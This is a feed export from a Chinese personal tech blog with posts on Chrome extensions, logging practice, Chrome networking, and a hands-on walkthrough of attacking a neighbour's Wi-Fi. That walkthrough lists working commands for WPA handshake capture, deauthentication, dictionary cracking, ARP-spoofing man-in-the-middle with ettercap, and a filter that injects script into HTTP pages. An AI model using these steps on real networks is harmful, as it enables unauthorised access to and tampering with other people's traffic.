bg'</span>, response);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inject.js</span></span><br><span class="line"><span class="comment">//----------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">var</span> shared = <span class="keyword">new</span> SharedWorker(localStorage.sharedWorkerURL);  </span><br><span class="line">shared.port.start();</span><br><span class="line">shared.port.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'inject'</span>, e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<h2 id="使用window-postMessage">使用window.postMessage</h2><p>经网友提醒，参考Chrome开发文档中<a href="https://developer.chrome.com/extensions/content_scripts#host-page-communication" target="_blank" rel="external">针对content script通信的说明</a>。使用window.postMessage可以很好进行双向通信。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在折腾小工具的时候有产生了奇怪的需求，Chrome 插件需要监听任意网页中某个变量的变化，或是访问其中的值。但默认注入的 content.js 和原网页 Javascript 脚本并不运行在一个相同的环境中，无法相互访问。</p>
<p>搜索和自己尝试了如下的解决方法，现罗]]>
    </summary>
    
      <category term="chrome" scheme="http://yqf3139.github.io/tags/chrome/"/>
    
      <category term="javascript" scheme="http://yqf3139.github.io/tags/javascript/"/>
    
      <category term="web" scheme="http://yqf3139.github.io/tags/web/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[尝试“偷窥”邻居的网络流量]]></title>
    <link href="http://yqf3139.github.io/2015/12/25/try-to-snoop-using-wifi/"/>
    <id>http://yqf3139.github.io/2015/12/25/try-to-snoop-using-wifi/</id>
    <published>2015-12-25T11:35:34.000Z</published>
    <updated>2015-12-25T14:11:31.663Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_折腾的缘由">0x00 折腾的缘由</h1><p>不知什么时候看到<a href="http://lcx.cc/?i=4257" target="_blank" rel="external">这篇文章</a>后，我便对其中主人公对一个模拟的邻居进行攻击的过程产生了好奇，由于原文没有详细描述攻击的每一个步骤，便想着什么时候在一个安全的环境下重现一下。</p>
<p>首先明确接下来的操作都是安全无害的，虽然的确劫持到了其他人的一些流量，但并没有继续解密流量了，尝试修改流量也只是针对自己设备。</p>
<p>然后我们来假象这么一个目标，劫持到邻居的流量，这可以用来分析ta，并修改流量，达到浏览器弹窗、修改网页布局的效果。</p>
<p>这简单的实现可以使用古老但好用的<a href="www.zhihu.com/question/20338649">ARP攻击</a>，将目标的流量欺骗到攻击人的网卡上，便可以开展中间人攻击了。不过这要求我们在同一个局域网中，比如连接了同一个无线路由器。一般可以搜索到邻居的无线路由器，一旦破解了其登陆密码，便可以扫描到目标的设备，进行攻击了。</p>
<h1 id="0x01_尝试破解Wifi">0x01 尝试破解Wifi</h1><p>一般我们的设备和邻居的设备不在同一内网中，所以第一难关就是攻克无线路由器。如果像我一样，插上网线发现就已经和邻居在同一内网中，那么就可以跳过这一步了。</p>
<h2 id="使用的武器">使用的武器</h2><p><a href="http://www.aircrack-ng.org/" target="_blank" rel="external">Aircrack-ng</a>是常用的用于破解无线802.11WEP及WPA-PSK加密的工具。Linux用户下载源码编译安装即可。<br>其中需要Ubuntu用户预先<code>apt-get install libnl-3-dev libnl-genl-3-dev</code>安装几个依赖。</p>
<p>Mercury 150Mbps MW150U是一个无线USB网卡，Ubuntu免驱使用，由于可以开启Monitor模式，既可以用于台式机的无线上网，也可以偶尔做做无线网络的实验。</p>
<p>查看网卡后发现我的笔记本网卡和USB网卡都可以用于实验：</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">phy0    wlan0       ath9k       Qualcomm Atheros AR9285 Wireless Network</span><br><span class="line">phy1    wlan1       rt2800usb   Ralink Technology, Corp. RT5370</span><br><span class="line"></span><br><span class="line"><span class="escape">``</span>`</span><br></pre></td></tr></table></figure>
<h2 id="选择攻击目标">选择攻击目标</h2><p>一切就绪，首先让网卡进入Monitor模式，这运行程序获取到更底层的无线网络数据，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng <span class="operator"><span class="keyword">start</span> wlan1</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span></span><br></pre></td></tr></table></figure>
<p><code>ifconfig</code>后发现<code>wlan1mon</code>。</p>
<p>继续开始审查周围的无线网络，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng <span class="operator"><span class="keyword">start</span> wlan0</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span></span><br></pre></td></tr></table></figure>
<p><img src="/images/try-to-snoop-using-wifi/searching.png" alt="search"></p>
<p>可以看到周边的无线热点，按照信号强度由强到弱排序，其中<code>BSSID</code>是热点的Mac地址，<code>CH</code>是热点的信道（WIFI2.4Ghz分有13个互相有重叠的信道），<code>ENC</code>是加密方式，可以发现基本都是WPA2加密，<code>ESSID</code>是名称，好了，我们基本就只需要关注这些。</p>
<p>挑选一个victim，记下它的信息。</p>
<h2 id="捕获WPA的握手包">捕获WPA的握手包</h2><p>要想破解无线密码，我们先捕捉两台设备成功握手的包。虽然其中也不含密码，但我们可以用这一信息来暴力验证密码字典中的密码是否正确。</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">sudo</span> <span class="comment">airodump</span><span class="literal">-</span><span class="comment">ng</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">ivs</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">ignore</span><span class="literal">-</span><span class="comment">negative</span><span class="literal">-</span><span class="comment">one</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">bssid</span> <span class="comment">目标热点MAC</span> <span class="literal">-</span><span class="comment">w</span> <span class="comment">保存文件的名称</span> <span class="literal">-</span><span class="comment">c</span> <span class="comment">信道</span> <span class="comment">wlan1mon</span></span><br><span class="line"><span class="comment">```</span></span><br></pre></td></tr></table></figure>
<p>现在我们看到开始抓包，</p>
<p><img src="/images/try-to-snoop-using-wifi/waiting-for-handshake.png" alt="waiting-for-handshake"></p>
<p>不过是否能快速捕获握手包取决于两个因素，信号强弱、是否现在有活跃的设备正在和热点通信。为了尽快获取到握手包，常规做法是广播中断连接的信号，强制踢设备下线，再连接就有我们想要的握手包了。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo aireplay-ng -<span class="number">0</span> <span class="number">30</span> -<span class="literal">a</span> 目标热点MAC  wlan1mon</span><br><span class="line"><span class="escape">``</span>`</span><br></pre></td></tr></table></figure>
<p>幸运地话，很快就能看到握手包捕捉成功，</p>
<p><img src="/images/try-to-snoop-using-wifi/get-handshake.png" alt="get-handshake"></p>
<h2 id="离线破解，拼算力的时候到了">离线破解，拼算力的时候到了</h2><p>目前WPA的加密是捕获热点和设备间的握手信息，再离线用密码字典爆破，按理来说都是可以破解的，不过时间不允许我们这么做，由于一般密码很弱，比如8位纯数字，或者是非常常见，如password。一个好的字典囊括了最常见的密码，让我们能瞬间破解很多热点。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w ~/Downloads/dict/<span class="number">0</span>-<span class="number">9.8</span>位纯数密码<span class="class">.txt</span> my-<span class="number">01</span><span class="class">.ivs</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p>4T 2.2GHz的破解速度只有90000个/秒的破解速度，把0-9的8位纯数密码扫描一遍要1000分钟了。</p>
<p>不过常见密码是很好破解的，</p>
<p><img src="/images/try-to-snoop-using-wifi/get-passwd.png" alt="get-passwd"></p>
<p>所以，<strong>一定要把无线密码设置得非常特殊，长度12位以上，切记切记</strong>，还有防止软件偷走密码去分享。</p>
<h1 id="0x02_扫描内网设备">0x02 扫描内网设备</h1><p>成功登入后，首要访问一下<code>192.168.1.1</code>或<code>192.168.1.253</code>，这是路由器管理界面的常见入口，比如我登的就是admin/admin口令，控制了路由器就更加自由了。可以进行DNS攻击，刷路由器固件等。</p>
<p>如何在不登陆路由器管理界面的情况下，看看内网内的其他设备的情况呢？nmap登场，神级工具之前一直没用过，最近才看到其他人使用。</p>
<p>简单用法如下，更多请参阅<a href="http://blog.csdn.net/zmj_88888888/article/details/9138399" target="_blank" rel="external">他人的简单的教程</a><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  <span class="tag">nmap</span> <span class="tag">-sP</span> 192<span class="class">.168</span><span class="class">.1</span><span class="class">.1-254</span></span><br><span class="line"></span><br><span class="line"><span class="tag">Nmap</span> <span class="tag">scan</span> <span class="tag">report</span> <span class="tag">for</span> <span class="tag">xxxxxxxdeiPhone</span> (192<span class="class">.168</span><span class="class">.1</span><span class="class">.7</span>)</span><br><span class="line"><span class="tag">Host</span> <span class="tag">is</span> <span class="tag">up</span> (0<span class="class">.031s</span> <span class="tag">latency</span>).</span><br><span class="line"><span class="tag">All</span> 100 <span class="tag">scanned</span> <span class="tag">ports</span> <span class="tag">on</span> <span class="tag">feixiandeiPhone</span> (192<span class="class">.168</span><span class="class">.1</span><span class="class">.7</span>) <span class="tag">are</span> <span class="tag">closed</span></span><br><span class="line"><span class="tag">MAC</span> <span class="rule"><span class="attribute">Address</span>:<span class="value"> XX:XX:XX:XX:XX (Apple)</span><br><span class="line">Too many fingerprints match this host to give specific OS details</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">```</span></span></span><br></pre></td></tr></table></figure></p>
<p>哈，发现一个人的iPhone。</p>
<h1 id="0x03_简单进行Arp攻击">0x03 简单进行Arp攻击</h1><p>现在，真正的攻击上演了。我们要将上面找到的victim的流量欺骗到我们的网卡上，<a href="https://ettercap.github.io/ettercap/" target="_blank" rel="external">ettercap</a>登场，<code>apt-get</code>安装即可。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ettercap -i wlan1 -T -M arp:remote /<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span><span class="comment">// /192.168.1.7//</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p>执行中间人攻击，欺骗路由器和目标设备，这样本来由目标发下路由器的流量就发给了我方网卡，中转后再发向路由器。</p>
<h1 id="0x04_审查流量信息">0x04 审查流量信息</h1><p>配合<code>wireshark</code>审查浏览，不过现在HTTPS加密已经流行起来，似乎只有HTTP明文可以被我们分析了。</p>
<p><img src="/images/try-to-snoop-using-wifi/wireshark.png" alt="wireshark"></p>
<p>似乎到了饭点，在定外卖……</p>
<h1 id="0x05_修改流量信息">0x05 修改流量信息</h1><p>接下来攻击自己手机，尝试在HTTP明文中注入脚本。</p>
<p>还是使用<code>ettercap</code>，其中的<code>fliter</code>功能可以进行简单的文本查找和替换，虽然十分低效。高效的方法需要加入HTTP解析，这样方便过滤和注入。</p>
<p>fliter代码，</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (ip.proto == TCP &amp;&amp; tcp.dst == 80) &#123;</span><br><span class="line">    if (search(DATA.data, "Accept-Encoding")) &#123;</span><br><span class="line">        replace("Accept-Encoding", "Accept-Nothing"); # 防止GZIP压缩</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123;</span><br><span class="line">    replace("<span class="tag">&lt;<span class="title">title</span>&gt;</span>", "<span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">\"text</span>/<span class="attribute">javascript</span>\"&gt;</span><span class="actionscript">alert(<span class="string">'Hack'</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">title</span>&gt;</span>");</span><br><span class="line">    replace("<span class="tag">&lt;<span class="title">title</span>&gt;</span>","<span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"><span class="tag">html</span><span class="rules">&#123;<span class="rule"><span class="attribute">overflow-y</span>:<span class="value">scroll</span></span>;<span class="rule"><span class="attribute">filter</span>:<span class="value">progid:DXImageTransform.Microsoft.<span class="function">BasicImage</span>(grayscale=<span class="number">1</span>)</span></span>;<span class="rule"><span class="attribute">-webkit-filter</span>:<span class="value"><span class="function">grayscale</span>(<span class="number">100%</span>)</span></span>;&#125;</span></span><span class="tag">&lt;/<span class="title">style</span>&gt;</span><span class="tag">&lt;<span class="title">title</span>&gt;</span>");</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p>预先编译为<code>ettercap</code>可加载的二进制模块，</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">etterfilter f.filter -o <span class="function"><span class="keyword">fun</span>.<span class="title">ef</span></span></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>重新进行攻击，这时候流量被匹配后修改，</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ettercap -i wlan0 -<span class="constant">T</span> -<span class="constant">M</span> <span class="symbol">arp:</span>remote -<span class="constant">F</span> <span class="function"><span class="keyword">fun</span>.<span class="title">ef</span></span> /<span class="number">192.168</span>.<span class="number">31.1</span>/<span class="regexp">/ /</span><span class="number">192.168</span>.<span class="number">31.155</span>/<span class="regexp">/</span><br><span class="line"></span><br><span class="line">```</span></span><br></pre></td></tr></table></figure>
<p>攻击效果，</p>
<p><img src="/images/try-to-snoop-using-wifi/v2ex.jpg" alt="v2ex"></p>
<p>脚本注入</p>
<p><img src="/images/try-to-snoop-using-wifi/smzdm.jpg" alt="smzdm"></p>
<p>哈，灰色默哀</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_折腾的缘由">0x00 折腾的缘由</h1><p>不知什么时候看到<a href="http://lcx.cc/?i=4257" target="_blank" rel="external">这篇文章</a>后，我便对其中主人公对一个模拟的邻居进行攻击的]]>
    </summary>
    
      <category term="linux" scheme="http://yqf3139.github.io/tags/linux/"/>
    
      <category term="wifi" scheme="http://yqf3139.github.io/tags/wifi/"/>
    
      <category term="security" scheme="http://yqf3139.github.io/categories/security/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[养成良好的Log习惯]]></title>
    <link href="http://yqf3139.github.io/2015/12/21/a-good-logging-habit/"/>
    <id>http://yqf3139.github.io/2015/12/21/a-good-logging-habit/</id>
    <published>2015-12-21T10:49:52.000Z</published>
    <updated>2016-01-23T21:57:20.050Z</updated>
    <content type="html"><![CDATA[<h1 id="不好的Log习惯带来了哪些问题？">不好的Log习惯带来了哪些问题？</h1><p>通常创新项目初期，我的确不是很注意编码规范，测试以及日志。由于需求和技术实现都不明确，如果太注重测试可能会框住自己的手脚。<strong>不过编码规范和日志是什么项目都应该注意的，一开始注意便能提升整个项目的效率，避免后期重构。</strong></p>
<p>项目各方面逐渐明确后，各种测试也是很重要的一环。在重构之前确定一些自动的回归测试和单元测试，能避免出现很多低级错误，这些错误一旦在集成时出现，可能会花费半天进行调试，最近苦不堪言下定决心改正。</p>
<p>之前打log一般便就是<code>printf</code>大法，总之输出各种变量的值，完全就是debug时的调试，项目后期便会各种调试信息混杂在一起，非得手动注释才行。在log中使用各种“奇技淫巧”，比如输出’=’组成的分割线，使用特殊符号的数量方便搜索，不断地改log、调试、再改，最后调试出了bug，log之后再也看不懂了。</p>
<p>最近问题来了，服务器代码需要发布和部署，后期我也没有机会维护了，重构后的代码虽然可读性好了很多，但log还是一团糟。最后花了一天时间统一了log输出的规范，方便进行fliter，调试起来也开心和效率很多。而且设置断点，单步调试的效率往往比<code>printf</code>大法好很多，应该少使用log进行调试。</p>
<h1 id="一个入门级别的log规范">一个入门级别的log规范</h1><h2 id="Javascript_&amp;&amp;_Android">Javascript &amp;&amp; Android</h2><p>框架已经提供了足够好的log工具，<code>console.log/info/warning/error/table</code>自带分级，并且结合Chrome的fliter，十分易用。在代码中加入<code>debugger;</code>便能让Chrome陷入断点，变量查看等都非常方便，Web程序员十分幸福。<br>Android也提供了类似的Logger，设置Tag并分级，Logcat中也可以进行搜索。在JNI开发中，通过<code>#define ALOGD(...)  __android_log_print(ANDROID_LOG_DEBUG,ALOG,__VA_ARGS__)</code>定义宏，也能很方便使用。之前一直通过stdout打印，非常混乱。</p>
<h2 id="Golang">Golang</h2><p>最后发现服务器的Log更是乱成一团，所有输出都是<code>printf</code>，不带分级和Tag，看起来混乱且不方便发布。Golang自带的Log包也不存在这些复杂的功能，最后并不想再依赖其他的包，还是简单封装一下为好。</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var logger *<span class="built_in">log</span>.Logger</span><br><span class="line">var LogLevel <span class="built_in">int</span> = INFO</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span> &#123;</span></span><br><span class="line">    logger = <span class="built_in">log</span>.New(os.Stdout, <span class="string">""</span>, <span class="built_in">log</span>.LstdFlags)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Debugf</span><span class="params">(tag string, argv ...interface&#123;&#125;)</span> &#123;</span></span><br><span class="line">    <span class="keyword">if</span> LogLevel &lt;= DEBUG &#123;</span><br><span class="line">        logger.Println(<span class="string">"DEBUG: ["</span>+tag+<span class="string">"]"</span>, argv)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">// 从命令行读取<span class="built_in">log</span> level</span><br><span class="line">log_level := flag.<span class="built_in">Int</span>(<span class="string">"loglevel"</span>, INFO, <span class="string">"the log level"</span>)</span><br><span class="line">webanalyzer.LogLevel = *log_level</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">server</span><span class="params">(...)</span>&#123;</span></span><br><span class="line">    defer <span class="function"><span class="keyword">func</span><span class="params">()</span> &#123;</span></span><br><span class="line">        <span class="keyword">if</span> err := recover()<span class="comment">; err != nil &#123;</span></span><br><span class="line">            // 在数据处理函数中，接下所有的panic，并将它们发给browser</span><br><span class="line">            // 这样服务器panic后，客户端可以显示一个比较友好的消息</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p>最后可以通过命令行参数控制log等级，方便发布，可以直接log到文件中，并可以在这里实现一个缓存（计划中），这样混乱的Debug信息部署时就不可见了。</p>
<p>看到其他程序很有条理的log信息，才意识到自己这里做得非常不足，养成这一习惯，应该能提升接下来的开发与调试效率。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="不好的Log习惯带来了哪些问题？">不好的Log习惯带来了哪些问题？</h1><p>通常创新项目初期，我的确不是很注意编码规范，测试以及日志。由于需求和技术实现都不明确，如果太注重测试可能会框住自己的手脚。<strong>不过编码规范和日志是什么项目都应该注意的，]]>
    </summary>
    
      <category term="golang" scheme="http://yqf3139.github.io/tags/golang/"/>
    
      <category term="javascript" scheme="http://yqf3139.github.io/tags/javascript/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Google Chrome 中的高性能网络技术实践（翻译）下]]></title>
    <link href="http://yqf3139.github.io/2015/12/16/high-perf-network-in-chrome-trans-2/"/>
    <id>http://yqf3139.github.io/2015/12/16/high-perf-network-in-chrome-trans-2/</id>
    <published>2015-12-16T02:54:59.000Z</published>
    <updated>2015-12-19T14:10:39.915Z</updated>
    <content type="html"><![CDATA[<h1 id="你使用浏览器进行会话的全过程">你使用浏览器进行会话的全过程</h1><p>通过前文我们已经能在心中绘制出Chrome网络栈的大致图样，现在让我们来详细了解一下浏览器中一系列面向用户的优化。现在，让我们想想我们刚刚创建了一个Chrome的用户档案，并准备开始上网冲浪了。</p>
<h2 id="优化游览器的冷启动体验">优化游览器的冷启动体验</h2><p><img src="/images/high-perf-network-in-chrome-trans/pagespeed.png" alt="pagespeed"></p>
<p>第一次启动Chrome的时候，它对你喜爱的网站、浏览习惯还了解甚少。但是，<strong>大多数人在浏览器冷启动后还是遵循着一个特定的使用习惯</strong>，比如打开电邮、新闻头条、社交网络和门户网站等等。具体的网站可能不同，但是它们其中的相似性可以帮助预测器来加速你每天一开始打开浏览器的体验！</p>
<p><strong>Chrome总是记着用户打开浏览器后最爱去的十大网站</strong>，不过需要注意的是这并不是全局浏览的前十，而仅仅是启动后的。浏览器加载的时候，Chrome就可以为这些站点发起DNS的预加载。好奇的你可以通过<code>chrome://dns</code>来查看你自己的启动域名列表。在这个网页的最上方，你会找到你账号的十大启动候选网站。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/startup-dns.png" alt="startup-dns"></p>
<p>以我账号举个栗子吧，我一般如何上网的呢？如果我是在写一篇文章的时候，我会直接导航去Google Docs。如你所料，我常去一些Google站点。</p>
<h2 id="优化与Omnibox的互动">优化与Omnibox的互动</h2><p><img src="/images/high-perf-network-in-chrome-trans/chrome-omnibox.png" alt="chrome-omnibox"></p>
<p>推出Omnibox是Chrome的一大创举，和先前的其他浏览器相比，Chrome的Omnibox可不仅仅只能输入目标URL。除了记住用户之前浏览过的URL以外，它也支持历史浏览记录的全文搜索，<em>(小技巧：输入网站的名称而不是URL)</em>，更可与你选择搜索引擎进行深度整合。</p>
<p>Omnibox会自动相应用户的输入，这可以是根据你历史的一个URL，或者是一个搜索查询。底层实现中，每个提示的动作都是按照和输入的相关程度进行排序，并参考之前的记录。事实上，你可以在<code>chrome://predictors</code>中查询到这些数据。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/xomnibox.png" alt="xomnibox"></p>
<p><strong>Chrome记忆着用户输入前缀词的一份历史记录，其提示的动作和成功执行的比例</strong>。对于我的历史来说，可以发现我每次敲入g后，我有76%的机率是向打开Gmail。而当我再输入”m”后(“gm”的缩写)，这一动作的可信率升到了99.8%。事实上，在412次我输入”gm”后，我只有一次并不是想打开Gmail。</p>
<p>但是，你可能会想，这一切关网络栈什么事情？这些黄黄绿绿的候选数据其实都是<code>ResourceDispatcher</code>的重要参考信号！如果我们产生了一个黄色信号，Chrome可能会发出一个DNS预查询。如果是一个绿色的更高可信度的信号，Chrome可能在DNS解析后发出一个TCP预连接。如果这些都做好了，但用户还没有做出决定，Chrome甚至会默默在后台页面渲染好这个网页。</p>
<p>还有一种可能是，如果就历史数据来看，当前输入的查询词没有很好的匹配，那么Chrome会对你搜索引擎进行DNS/TCP预加载，这是预测你很有可能发出一个搜索请求。</p>
<p><strong>对于一般用户来说，他们需要数百毫秒的时间来输入查询，并评估自动弹出的提示</strong>。在后台的Chrome便能从容地预加载、预连接甚至于在某些情况下预渲染这个网页，这样等用户敲击下”enter”键的时候，网络带来的延时影响已经没有了。</p>
<h2 id="优化缓存的性能">优化缓存的性能</h2><p>最快的Request，是这个请求根本没有发生。当我们谈及性能的时候，怎能不谈及缓存呢。作为网站开发人员，你得通过Expires,ETag,Last-Modified和Cache-Control这些<a href="https://developers.google.com/speed/docs/best-practices/caching" target="_blank" rel="external">response headers</a>来表明你服务器上资源文件的缓存状态，对吧？如果没有的话，快行动起来，我们等等没关系。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/chrome-incognito.webp" alt="chrome-incognito"></p>
<p>Chrome对于内部缓存有两种不同的实现：一种是本地磁盘缓存，一种使用内存。<strong>内存缓存是为<a href="http://support.google.com/chrome/bin/answer.py?hl=en&amp;answer=95464" target="_blank" rel="external">incognito浏览模式</a>准备的，当你关闭窗口后，一切干干净净</strong>。两种模式都实现了相同的接口(<code>disk_cache::Backend</code>和<code>disk_cache::Entry</code>)，这极大简化了架构设计。如果你对此有想法，可以很轻易地实验你的缓存实现。</p>
<p>从内部来说，磁盘缓存实现了自有的一套数据结构，它们都存放在你Profile目录下的文件夹中。其中，索引文件在浏览器启动时被直接映射入内存，而数据文件存放真实的数据，比如说HTTP头和其他统计信息。这里值得一提的是，最大不超过16KB的文件都存放在共享的数据块文件中，大文件直接存放在专有文件中。磁盘缓存需要实验LRU测量进行清扫，LRU的通常参考使用频率和资源的年龄。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/internals-cache.png" alt="internals-cache"></p>
<p>如果你对Chrome缓存感兴趣的话，不妨看看<code>chrome://net-internals/#httoCache</code>。如果你想查看实际的HTTP元数据和缓存的Response，你可以访问<code>chrome://cache</code>，它们会列出缓存中所有的资源详情。你可以搜索，并点击URl查看。</p>
<h2 id="使用预加载优化DNS">使用预加载优化DNS</h2><p>之前我们已经几次提到了DNS预解析，那在我们展开实现细节前，我们看看哪些情况下会触发DNS解析，和触发理由：</p>
<ul>
<li>在Render进程中运行的Blink文档解析器，可以提供其页面的所有URL中的域名，Chrome可以选择预先解析与否。</li>
<li>在用户发出请求之前，Render进程便可能触发一个鼠标悬浮事件，或是一个按钮点击事件。</li>
<li>在高匹配的情况下，Omnibox可能触发一个查询请求。</li>
<li>Chrome预测器在综合历史浏览记录和资源请求数据后，发出域名解析请求。</li>
<li>页面的开发者可以显式告诉Chrome，哪些域名可以预先解析。</li>
</ul>
<p>在所有以上的情况下，DNS预解析都只是被当做暗示来处理。Chrome不保证预解析一定会执行，而是通过综合判断所有的信号，使用预测器来判断是否执行。最“糟糕”的情况下，如果我们不能提前解析DNS，用户就必须要等待一个DNS解析时间，然后才是TCP连接和资源加载。不过，如果这一切发生的话，预测器会进行记录并以此优化未来的决策。这就是你越用，Chrome越快越聪明。</p>
<p>之前我们没有提到的一个优化是，<code>Chrome会发现每个网站的拓扑结构，并用这一信息为未来的浏览加速</code>。让我们回忆一下每个网页平均由88个资源的事实，其中资源从30+个独立的域名加载而来。这说明你每次进行网页浏览的时候，Chrome可以记录下网页上流行的资源文件。在以后它便可选择为一些、或者是全部发出一个DNS预加载和TCP预连接。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/xsubresource-stats.png" alt="xsubresource-stats"></p>
<p>你可访问<code>chrome://dns</code>来查看Chrome缓存的子站点的域名，并可以查询一下你关心的域名。上例可看出，对于Google+来说，Chrome记得六个子站点和DNS预解析/TCP预连接的统计数据，其中还有请求的期望值。这一内部的统计数据让Chrome预测器可以进行预测优化。</p>
<p>除了上述的所有内部信号，站点开发者还可以通过以下方式，即嵌入附加的预解析信息来暗示Chrome：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"dns-prefetch"</span> href=<span class="string">"//host_name_to_prefetch.com"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>那让浏览器自动来做不就好了吗？<strong>在某些情况下，可能有预解析一个文章中完全没有提及的域名</strong>。最经典的栗子当然就是跳转了：一个指向域名的链接，就比如一个追踪分析的服务，它功能就是将用户跳转到真实的地址下。Chrome仅仅依靠自己是没有办法做到的，而可以通过人工提供更好。</p>
<p>那么底层实现又是怎样的呢？不过这一答案恐怕和Chrome的版本有关，由于团队<em>总是</em>在实验更新更好的方法。不过整体上来看，Chrome的DNS组织结构有两大实现：之前Chrome使用平台无关的<code>getaddrinfo</code>系统调用，将这个查询全权交由系统进行，而现在逐步替换为<strong>Chrome自实现的异步DNS解析器</strong>。</p>
